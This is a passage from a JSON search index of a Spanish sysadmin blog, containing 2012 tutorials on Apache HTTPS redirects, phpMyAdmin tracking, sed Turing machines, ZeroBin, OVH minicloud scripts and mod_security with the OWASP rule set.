\" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/05/10/owncloud-con-mysql-en-ubuntu-lucid-lynx-10-04/","loc":"https://karpoke.ignaciocano.com/2012/05/10/owncloud-con-mysql-en-ubuntu-lucid-lynx-10-04/"},{"title":"Forzar el uso de SSL/HTTPS de un directorio en Apache2 mediante .htaccess y mod_rewrite","text":"Si queremos que el acceso a un directorio concreto, es decir, que afecte únicamente la ruta relativa en la URL que accede a ese directorio, se realice mediante una conexión segura, suponiendo que ya tenemos configurado el servidor de forma adecuada, basta incluir en ese directorio un fichero .htaccess que contenga: bash RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} Así, si por ejemplo, queremos que la ruta http://localhost/secure/ se acceda de forma segura, suponiendo que el DocumentRoot apunta a /var/www : bash $ pwd /var/www/secure bash $ cat .htaccess RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/05/10/forzar-el-uso-de-sslhttps-de-un-directorio-en-apache2-mediante-htaccess-y-mod_rewrite/","loc":"https://karpoke.ignaciocano.com/2012/05/10/forzar-el-uso-de-sslhttps-de-un-directorio-en-apache2-mediante-htaccess-y-mod_rewrite/"},{"title":"Opciones adicionales para trabajar con tablas vinculadas en phpMyAdmin","text":"Puede que alguna vez hayamos visto este mensaje en el panel de administración de phpMyAdmin: Las opciones adicionales para trabajar con tablas vinculadas fueron desactivadas. Para saber porqué, dé clic aquí . Si seguimos el enlace, nos lleva a la documentación donde nos explican que, a partir de la versión 3.3.x, está disponible el sistema de tracking , que es un sistema que permite realizar un seguimiento de las consultas SQL ejecutadas por phpMyAdmin, tanto sentencias de definición como de manipulación de datos, pudiendo guardar versiones de las tablas. Al guardar la versión de una tabla, phpMyAdmin guarda una captura de la misma, incluyendo su estructura e índices. Posteriormente, phpMyAdmin guardará todas las órdenes que cambien la estructura de la tabla o los datos contenidos en ella, y asociará dichas órdenes con el número de versión. Se podrán visualizar estos cambios en la pestaña de Seguimiento. Para permitir esta funcionalidad necesitamos: configurar pmadb y el almacenamiento de configuración en phpMyAdmin definir el nombre de la tabla en $cfg['Servers'][$i]['tracking'] Gracias a este almacenamiento de configuración se puede disfrutar de un gran variedad de funcionalidades tales como marcadores, comentarios, histórico de SQL, mecanismo de seguimiento, generación de PDFs, transformación de los campos de contenido, etc. Almacenamiento de configuración El primero paso será crear las tablas especiales necesarias. En el fichero /usr/share/doc/phpmyadmin/examples/create_tables.sql.gz tenemos un ejemplo de lo necesario. Posiblemente, ya tengamos creadas algunas de las tablas que ahí aparecen, si lanzamos el script sólo nos creará las que no existan: bash $ cp /usr/share/doc/phpmyadmin/examples/create_tables.sql.gz . $ gunzip create_tables.sql.gz $ mysql -uroot -p < create_tables.sql Si necesitásemos recuperar la contraseña de MySQL o tuviéramos problemas importando los datos podemos echarle un ojo a estos enlaces. En particular, lo que nos interesa es lo referente a la tabla pma_tracking , y esto es lo que ejecuta el script anterior: ```bash -- Table structure for table pma_tracking CREATE TABLE IF NOT EXISTS pma_tracking ( db_name varchar(64) collate utf8_bin NOT NULL, table_name varchar(64) collate utf8_bin NOT NULL, version int(10) unsigned NOT NULL, date_created datetime NOT NULL, date_updated datetime NOT NULL, schema_snapshot text collate utf8_bin NOT NULL, schema_sql text collate utf8_bin, data_sql text collate utf8_bin, tracking set('UPDATE','REPLACE','INSERT','DELETE','TRUNCATE','CREATE DATABASE','ALTER DATABASE','DROP DATABASE','CREATE TABLE','ALTER TABLE','RENAME TABLE','DROP TABLE','CREATE INDEX','DROP INDEX','CREATE VIEW','ALTER VIEW','DROP VIEW') collate utf8_bin default NULL, tracking_active int(1) unsigned NOT NULL default '1', PRIMARY KEY ( db_name , table_name , version ) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin ROW_FORMAT=COMPACT; ``` Configurar phpMyAdmin Ahora que ya hemos creado las tablas necesarias, deberemos configurar los parámetros que necesita phpMyAdmin. En Ubuntu, editamos el archivo /etc/phpmyadmin/config.inc.php , y nos aseguramos de que aparecen las siguientes líneas: ```bash / Optional: User for advanced features / \\(cfg['Servers'][\\) i]['controluser'] = \\(dbuser; $cfg['Servers'][\\) i]['controlpass'] = $dbpass; / Optional: Advanced phpMyAdmin features / \\(cfg['Servers'][\\) i]['pmadb'] = \\(dbname; $cfg['Servers'][\\) i]['bookmarktable'] = 'pma_bookmark'; \\(cfg['Servers'][\\) i]['relation'] = 'pma_relation'; \\(cfg['Servers'][\\) i]['table_info'] = 'pma_table_info'; \\(cfg['Servers'][\\) i]['table_coords'] = 'pma_table_coords'; \\(cfg['Servers'][\\) i]['pdf_pages'] = 'pma_pdf_pages'; \\(cfg['Servers'][\\) i]['column_info'] = 'pma_column_info'; \\(cfg['Servers'][\\) i]['history'] = 'pma_history'; \\(cfg['Servers'][\\) i]['designer_coords'] = 'pma_designer_coords'; ``` Los valores de controluser , controlpass y pmadb se toman del archivo /etc/phpmyadmin/config-db.php . A continuación de las líneas anteriores, añadimos: bash /_ Optional: Tracking features _/ $cfg['Servers'][$i]['tracking'] = 'pma_tracking'; $cfg['Servers'][$i]['tracking_default_statements'] = 'CREATE TABLE,ALTER TABLE,DROP TABLE,RENAME TABLE,CREATE INDEX,DROP INDEX,INSERT,UPDATE,DELETE,TRUNCATE,REPLACE,CREATE VIEW,ALTER VIEW,DROP VIEW,CREATE DATABASE,ALTER DATABASE,DROP DATABASE'; $cfg['Servers'][$i]['tracking_version_auto_create'] = TRUE; $cfg['Servers'][$i]['tracking_version_drop_view'] = TRUE; $cfg['Servers'][$i]['tracking_version_drop_table'] = TRUE; $cfg['Servers'][$i]['tracking_version_drop_database'] = TRUE; Y ya está. No es necesario reiniciar el servidor, pero es posible que necesitemos borrar las cookies del navegador para que no volvamos a ver el mensaje del principio, por ejemplo, cerrando la sesión en phpMyAdmin y volviendo a entrar, o recargando la caché del navegador mediante Ctrl+Shift+r . Referencias » phpMyAdmin doc: almacenamiento de configuración para phpMyAdmin » phpMyAdmin doc: pmadb » phpMyAdmin doc: tracking if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/05/10/opciones-adicionales-para-trabajar-con-tablas-vinculadas-en-phpmyadmin/","loc":"https://karpoke.ignaciocano.com/2012/05/10/opciones-adicionales-para-trabajar-con-tablas-vinculadas-en-phpmyadmin/"},{"title":"sed es Turing completo","text":"¿Cómo puede ser un editor de flujo, una utilidad para el tratamiento de texto, un lenguaje Turing completo? sed permite saltos condiciones e incondicionales y utiliza un buffer temporal, lo que permite construir una máquina de Turing con él , y cualquier lenguaje que pueda construir una máquina de Turing es Turing completo. Una implementación de una máquina de Turing con sed es turing.sed . Un ejemplo de programa que realiza el incremento de un número binario es el siguiente: ```bash | 10010111 State 0 0 R0 011R1 000R1 State 1 1 L2 100R1 111R1 State 2 2 1R3 201R3 210L2 State 3 3 RF 300R3 311R3 ``` En la primera línea se muestra el contenido de la cinta a la derecha del cursor, marcado por una barra vertical. Las siguientes líneas del programa son las reglas que definen lo que debe hacer la máquina de Turing, y tienen la siguiente sintaxis: bash estado_actual símbolo_actual nuevo_símbolo dirección nuevo_estado Para ejecutar el programa: bash $ sed -f turing.sed < increment.tm (0) | |10010111 (0) |1|0010111 (1) 1|0|010111 (1) 10|0|10111 (1) 100|1|0111 (1) 1001|0|111 (1) 10010|1|11 (1) 100101|1|1 (1) 1001011|1| (1) 10010111| | (2) 1001011|1| (2) 100101|1|0 (2) 10010|1|00 (2) 1001|0|000 (3) 10011|0|00 (3) 100110|0|0 (3) 1001100|0| (3) 10011000| | (F) 10011000 | | Final state F reached... end of processing La salida muestra el estado en el que está la máquina, el contenido de la cinta y la posición del cursor entre dos barras verticales. El siguiente programa concatena dos cadenas de unos: ```bash concatenate two strings of 1's | 11011 State 0 0 R0 000R0 01 R1 State 1 111R1 100R2 State 2 200R2 211R3 State 3 3 1L4 301L4 311R3 State 4 411L4 400L5 State 5 5 R7 500L5 511L6 State 6 6 R0 600R0 611L6 State 7 700R7 711R8 state 8 811R8 8 RF 800RF ``` Otros ejemplos: » Tetris » Sokoban (juego » Calculator Referencias » A proof that Unix utility \"sed\" is Turing complete » Implementation of a Turing Machine as Sed Script » Turing machine simulator","tags":"dev","url":"https://karpoke.ignaciocano.com/2012/04/22/sed-es-turing-completo/","loc":"https://karpoke.ignaciocano.com/2012/04/22/sed-es-turing-completo/"},{"title":"ZeroBin","text":"ZeroBin es una aplicación web de código abierto que permite subir textos, al estilo pastebin.com , pero cifrados, de tal manera que nadie que no conozca la clave puede tener acceso, ni siquiera el servidor. Los datos se cifran y descifran en el navegador usando una clave AES de 256 bits, utilizando la librería de cifrado y descifrado en JavaScript de la universidad de Standford. Es rápido, fácil de utilizar y no necesita una base de datos, tan solo un servidor de páginas PHP (5.2.6+) y un navegador moderno con soporte JavaScript habilitado. Permite configurar que el contenido expire en un tiempo determinado o comenzar una conversación entorno a él, entre algunas de sus características, y otras que vendrán en futuras versiones. Instalación Cabe recordar que es una versión alpha , susceptible de contener fallos. Para instalar la aplicación, sólo tenemos que descargar el archivo y descomprimirlo en un directorio accesible por nuestro servidor web: bash $ mkdir zerobin $ cd zerobin $ wget http://sebsauvage.net/files/zerobin_0.15_alpha.zip $ unzip zerobin_0.15_alpha.zip Le asignamos el propietario y los permisos necesarios. Por ejemplo: bash $ sudo chown -R www-data:www-data zerobin Un ejemplo de uso lo tenemos en anonpaste.tk/ . Referencias » ZeroBin » Stanford Javascript Crypto Library","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/04/21/zerobin/","loc":"https://karpoke.ignaciocano.com/2012/04/21/zerobin/"},{"title":"Arrancar y parar instancias minicloud de OVH desde el terminal","text":"Si tenemos un minicloud con OVH, podemos gestionar las instancias (máquinas vituales) con un script creado por Dominique Gallot . El script utiliza la API SOAP de OVH , de tal manera que permite obtener información sobre las instancias, arrancarlas y pararlas desde el terminal, sin tener que hacerlo desde el panel de administración. En la página de OVH tienen el script ovhclud , para gestionar la nube (Public Cloud) , pero parece que todavía no soporta las instancias de minicloud . Instalación Para descargar el script de la página de Gallot: bash $ wget -q http://svn.gallot.be/blog/ovh-cloud-api/ovh.pm $ wget -q http://svn.gallot.be/blog/ovh-cloud-api/ovh.pl $ chmod a+x ovh.pl El script utiliza la librería libsoap-lite-perl , por lo que deberá estar instalada en el sistema. Acciones Para obtener un listado de los servicios que tenemos: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a listservice Services name : ab12345-cloud0 title : Cloud zone : ab1c2.project.ovh.net Para listar las instancias: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -q -a listvm cloud1 12345 running 211.58.125.116 Para listar una instancia concreta: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -q -a listvm -s cloud1 cloud1 12345 running 211.58.125.116 En este caso, hay una instancia encendida. Si queremos pararla sólo tenemos que especifica el nombre de la misma: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a stopvm -m cloud1 Podemos comprobar que está parada: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a listvm name : cloud1 id : 12345 state : stopped ip : ipDns : Para arrancar la instancia también debemos especificar el nombre: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a startvm -m cloud1 Si acto seguido comprobamos la instancia, vemos que ya tiene asignada una IP (distinta a la anterior), aunque está marcada como stopped : bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a listvm name : cloud1 id : 12345 state : stopped ip : 136.125.58.211 ipDns : mc-136-125-58-211.ovh.net Transcurrido el tiempo que la instancia tarda en arrancar, ya queda marcada como encendida: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a listvm name : cloud1 id : 12345 state : running ip : 136.125.58.211 ipDns : mc-136-125-58-211.ovh.net También podemos reiniciarla: bash $ ./ovh.pl -u ab12345-ovh -p mypassword -a rebootvm Si queremos seguir el intercambios de mensajes SOAP podemos añadir el argumento -t . Parar una instancia proporcionando su URL o su IP Teniendo esto en cuenta, el siguiente script stop-cloud-url.sh detiene la instancia dada su URL: ```bash !/bin/bash - USERNAME=ab12345-ovh PASSWORD=mypassword DOMAIN=\" \\(1\" IP=\\) (host \" \\(DOMAIN\" | awk '{print $NF}') VMNAME=\\) (ovh.pl -u $USERNAME -p $PASSWORD -q -a listvm | grep $IP | awk '{print $1}') ovh.pl -u $USERNAME -p $PASSWORD -a stopvm -m $VMNAME ``` Si, en lugar de un dominio, tenemos su IP, podemos detener la instancia usando el script stop-cloud-ip.sh : ```bash !/bin/bash - USERNAME=ab12345-ovh PASSWORD=mypassword IP=\" \\(1\" VMNAME=\\) (ovh.pl -u $USERNAME -p $PASSWORD -q -a listvm | grep $IP | awk '{print $1}') ovh.pl -u $USERNAME -p $PASSWORD -a stopvm -m $VMNAME ``` Can't locate ovh.pm in @INC El script ovh.pl hace uso del paquete ovh.pm . Si no ejecutamos ovh.pl desde el mismo directorio en el que está ovh.pm se quejará de que no lo encuentra . Para solucionarlo, podemos copiar el paquete a una ruta incluido en el @INC (más o menos como el CLASSPATH de Java o el PYTHONPATH de Python): bash $ perl -e 'print \"@INC\";' /etc/perl /usr/local/lib/perl/5.12.4 /usr/local/share/perl/5.12.4 /usr/lib/perl5 /usr/share/perl5 /usr/lib/perl/5.12 /usr/share/perl/5.12 /usr/local/lib/site_perl . También podemos incluir la siguiente directiva, en ovh.pl , para que incluya el directorio donde se encuentra ovh.pm : bash use lib '/home/myuser/modules'; Programar el encendido o apagado de una instancia Programar el encendido o apagado de la instancia se vuelve muy sencillo. Si queremos programar un encendido o apagado a una hora concreta, o dentro de un tiempo determinado: bash $ at 08:00 $ at midnight $ at noon $ at now $ at now + 5 minutes $ at midnight + 2 weeks Después, introducimos la ruta del script y terminamos con &#94;D (control+D). Si queremos que sea algo periódico, por ejemplo, de lunes a viernes de 7am a 5pm, utilizaremos el cron : ```bash $ crontab -e m h d mon dow(0=sunday) 0 7 * 1-5 /path/to/start-cloud.sh 0 17 * 1-5 /path/to/stop-cloud-url.sh sub.domain.com ``` if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/04/20/arrancar-y-parar-instancias-minicloud-de-ovh-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2012/04/20/arrancar-y-parar-instancias-minicloud-de-ovh-desde-el-terminal/"},{"title":"Apache2 y mod_security en Ubuntu Lucid Lynx 10.04","text":"mod_security es un módulo de Apache que actua como cortafuegos, protegiendo contra diversos tipos de ataque, y permitiendo monitorizar el tráfico HTTP en tiempo real. Por sí solo, el módulo no provee la protección, sino que deben añadirse reglas. Afortunadamente, existen conjuntos de reglas predefinidos, como el OWASP ModSecurity Core Rule Set Project, que nos facilitan la tarea. Al contrario que los sistemas de detección de intrusos, basados en firmas de vulnerabilidades conocidas, este conjunto de reglas protege contra vulnerabilidades desconocidas que pueda haber en las aplicaciones web. Instalación de mod_security Podemos descargarnos el código desde su web, desde su repositorio de versiones o desde el repositorio de paquetes de la distribución. Para descargarlo desde el repositorio de Ubuntu: bash $ sudo aptitude install libxml2 libxml2-dev libxml2-utils libaprutil1 libaprutil1-dev $ sudo aptitude install libapache-mod-security La versión que se instala es la 2.5.11-1. Aunque la última versión estable en su web es la 2.6.2, esta vez utilizaremos la del repositorio de Ubuntu. Para activar el módulo: bash $ sudo a2enmod mod-security Y reiniciamos Apache: bash $ sudo apache2ctl restart Configuración inicial Podemos crear un archivo donde configuremos algunas directivas en /etc/apache2/conf.d/modsecurity.conf . Por ejemplo, donde se encuentra el fichero de log : bash SecAuditLog /var/log/apache2/mod-security.log Reiniciamos Apache para que los cambios tengan efecto: bash $ sudo apache2ctl restart Reglas OWASP Descargamos la última versión de las reglas (2.2.4) y lo descomprimimos en el directorio /etc/apache2 . Para evitar problemas, las descargaremos en el directorio /etc/apache2 : bash $ cd /etc/apache2 $ sudo wget http://downloads.sourceforge.net/project/mod-security/modsecurity-crs/0-CURRENT/modsecurity-crs_2.2.4.tar.gz $ sudo tar xvzf modsecurity-crs_2.2.4.tar.gz $ sudo chown -R root:root modsecurity-crs_2.2.4 $ sudo mv modsecurity-crs_2.2.4 modsecurity-crs Hay cinco directorios de reglas con diferentes tipos de regla: activated_rules base_rules experimental_rules optional_rules slr_rules Configuración básica Empezaremos con la configuración básica que viene de ejemplo. Copiamos el archivo de configuración: bash $ cd /etc/apache2/modsecurity-crs $ sudo cp modsecurity_crs_10_config.conf.example modsecurity_crs_10_config.conf Para que se tengan en cuenta las reglas, añadiremos al final del fichero /etc/apache2/apache2.conf : ```bash Include modsecurity-crs/modsecurity_crs_10_config.conf Include modsecurity-crs/base_rules/*.conf ``` Deberemos reiniciar Apache. bash $ sudo apache2ctl restart Error creating rule: Unknown variable: REQBODY_ERROR Si al reiniciar el Apache nos aparece este error, se debe a que esta versión de las reglas es para mod_security versión 2.6 o superior. Sin embargo, basta renombrar esta variable por su valor anterior en el fichero modsecurity-crs/base_rules/modsecurity_crs_20_protocol_violations.conf , para que se solucione el error: bash $ cd /etc/apache2/modsecurity-crs/base_rules $ sudo sed -i 's/&#94;SecRule REQBODY_ERROR/SecRule REQBODY_PROCESSOR_ERROR/' modsecurity_crs_20_protocol_violations.conf Más reglas Podemos crear una configuración personalizada, utilizando el directorio activated_rules para incluir enlaces simbólicos a las reglas que queremos activar. En el fichero README hay una explicación detallada de cada regla. Primero, modificaremos el archivo /etc/apache2/apache2.conf para que contenga: ```bash Include modsecurity-crs/modsecurity_crs_10_config.conf Include modsecurity-crs/activated_rules/*.conf ``` Por ejemplo, para incluir las reglas básicas: bash $ cd /etc/apache2/modsecurity-crs/activated-rules $ for f in $(ls /etc/apache2/modsecurity-crs/base_rules); do sudo ln -s ../base_rules/$f $f done Para incluir las reglas de spam : bash $ cd /etc/apache2/modsecurity-crs/activated_rules $ for f in $(ls /etc/apache2/modsecurity-crs/optional_rules | grep comment_spam); do sudo ln -s ../optional_rules/$f $f done Para incluir todas las reglas opcionales: bash $ cd /etc/apache2/modsecurity-crs/activated_rules $ for f in $(ls /etc/apache2/modsecurity-crs/optional_rules); do sudo ln -s ../optional_rules/$f $f done Reiniciamos Apache: bash $ sudo apache2ctl restart Actualización de las reglas Si ya tenemos las reglas instaladas y queremos comprobar si hay actualizaciones, en el directorio modsecurity-crs/util hay un script que facilita el proceso. Para comprobar si hay reglas nuevas: ```bash $ ./rules-updater.pl -rhttps://www.modsecurity.org/autoupdate/repository/ -l Could not load GnuPG module - cannot verify ruleset signatures Repository: https://www.modsecurity.org/autoupdate/repository modsecurity-crs { 2.0.0: modsecurity-crs_2.0.0.zip 2.0.1: modsecurity-crs_2.0.1.zip 2.0.2: modsecurity-crs_2.0.2.zip 2.0.3: modsecurity-crs_2.0.3.zip 2.0.4: modsecurity-crs_2.0.4.zip 2.0.5: modsecurity-crs_2.0.5.zip 2.0.6: modsecurity-crs_2.0.6.zip 2.0.7: modsecurity-crs_2.0.7.zip 2.0.8: modsecurity-crs_2.0.8.zip 2.0.9: modsecurity-crs_2.0.9.zip 2.0.10: modsecurity-crs_2.0.10.zip 2.1.0: modsecurity-crs_2.1.0.zip 2.1.1: modsecurity-crs_2.1.1.zip 2.1.2: modsecurity-crs_2.1.2.zip 2.2.0: modsecurity-crs_2.2.0.zip 2.2.1: modsecurity-crs_2.2.1.zip 2.2.2: modsecurity-crs_2.2.2.zip 2.2.3: modsecurity-crs_2.2.3.zip 2.2.4: modsecurity-crs_2.2.4.zip } ``` Para actualizar a la última versión, primero crearemos un directorio donde se van a descargar y después las descargamos: bash $ cd /tmp $ mkdir crs $ ./rules-updater.pl -rhttp://www.modsecurity.org/autoupdate/repository/ -pcrs -Smodsecurity-crs Esto nos descarga el fichero con las últimas reglas, en este caso modsecurity-crs_2.2.4.zip . Actualización a 2 de junio de 2013 Parece ser que, actualmente, al intentar actualizar las reglas, nos encontremos con un error 404: bash $ sudo ./rules-updater.pl -rhttp://www.modsecurity.org/autoupdate/repository/ -pcrs -Smodsecurity-crs Could not load GnuPG module - cannot verify ruleset signatures Fetching: modsecurity-crs/modsecurity-crs_2.2.5.zip ... Failed to retrieve ruleset modsecurity-crs/modsecurity-crs_2.2.5.zip: 404 Not Found Podemos encontrar el fichero de reglas para la última versión de mod_security , la 2.2.7, en el repostorio en GitHub . Pero si queremos descargar una versión anterior, podemos recurrir al paquete modsecurity-crs en Launchpad . bash $ wget https://launchpad.net/ubuntu/+archive/primary/+files/modsecurity-crs_2.2.5.orig.tar.gz $ md5sum modsecurity-crs_2.2.5.orig.tar.gz aaeaa1124e8efc39eeb064fb47cfc0aa modsecurity-crs_2.2.5.orig.tar.gz $ tar xvzf modsecurity-crs_2.2.5.orig.tar.gz $ sudo cp -R modsecurity-crs_2.2.5 /etc/apache2/ $ sudo rm /etc/apache2/modsecurity-crs $ cd /etc/apache2 $ sudo ln -s modsecurity-crs_2.2.5 modsecurity-crs Después de copiarlo al directorio de apache, deberemos crear un fichero de configuración, por ejemplo a partir del fichero de ejemplo que viene tal como hicimos al instalarlo sólo que ahora tiene un nombre diferente, y reiniciar apache para que los cambios tengan efecto: bash $ cd /etc/apache2/modsecurity-crs $ sudo cp modsecurity_crs_10_setup.conf.example modsecurity_crs_10_setup.conf Si utilizamos la nueva nomenclatura para el fichero, deberemos actualizar el fichero /etc/apache2/apache2.conf : ```bash Include modsecurity-crs/modsecurity_crs_10_setup.conf Include modsecurity-crs/base_rules/*.conf ``` Una vez más, deberemos reiniciar Apache. Crypt::SSLeay or IO::Socket::SSL not installed Si nos aparece este error, es que nos faltan módulos: bash $ sudo aptitude install libcrypt-ssleay-perl libio-socket-ssl-perl Mediante mod_security se puede cambiar el valor de la cabecera Server . Lo primero será asegurarnos de que en el fichero /etc/apache2/conf.d/security contiene el valor: bash ServerTokens Full Añadimos al fichero /etc/apache2/conf.d/modsecurity.conf : bash SecServerSignature \"incognito\" Desactivamos y volvemos a activar el módulo, para que se cree el enlace simbólico a nuestro archivo de configuración, y reiniciamos Apache: bash $ sudo a2dismod mod-security $ sudo a2enmod mod-security $ sudo apache2ctl restart Ya podemos comprobar cómo la cabecera Server ha cambiado: bash $ curl -sI localhost/k/ | grep &#94;Server Server: incognito Referencias » mod_security » mod_security wiki » mod_security on Apache » Howto: Mod_security » OWASP ModSecurity Core Rule Set Project","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/04/12/apache2-y-mod_security-en-ubuntu-lucid-lynx-10-04/","loc":"https://karpoke.ignaciocano.com/2012/04/12/apache2-y-mod_security-en-ubuntu-lucid-lynx-10-04/"},{"title":"Medir el ancho de banda entre dos equipos de la red","text":"Mediante iperf podemos medir el ancho de banda de nuestra red. El programa se ejecuta en un equipo en modo 